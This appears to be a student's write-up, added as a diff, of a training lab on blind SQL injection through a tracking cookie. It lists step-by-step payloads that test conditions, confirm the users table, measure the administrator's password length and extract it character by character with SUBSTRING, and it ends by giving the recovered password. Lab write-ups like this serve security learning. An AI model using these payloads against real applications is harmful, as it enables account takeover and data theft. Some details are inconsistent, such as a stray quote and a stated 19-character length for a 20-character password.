@@ -1,0 +1,50 @@
+Lab 11: Blind SQL injection with conditional responses
+
+Vulnerable Parameter: Tracking Cookie
+
+End Goal
+
+1. Enumerate the password of the Administrator
+2. Login as Administrator User
+
+
+// By this we confirm Welcome back message.
+
+select tracking-id from tracking-table where trackingId = 'W38QxDbHl7l3MfgV' and 1=1--'
+
+
+// By this we confirm user table Exists.
+
+select tracking-id from tracking-table where trackingId = 'W38QxDbHl7l3MfgV' ' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--
+
+
+// Let's confirm the Administrator in user table
+
+select tracking-id from tracking-table where trackingId = 'W38QxDbHl7l3MfgV' AND (SELECT 'a' FROM users WHERE username = 'administrator') = 'a'--
+// Yes it's Exists
+
+
+// Enumerate the password of Administrator
+
+select tracking-id from tracking-table where trackingId = 'W38QxDbHl7l3MfgV' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) = 'a'--
+
+
+// After pushing the request to intruders and apply the payload so we get
+
+' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > $3$) = 'a'--
+
+-> password length is exact 19 char
+
+
+// Using SUBSTRING
+
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE USERNAME='administrator') = 'a'--
+
+
+-> First char = 7
+
+
+
+' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE USERNAME='administrator') = 'a'--
+
+so the password is 7dunsf0ber3thxna0iou
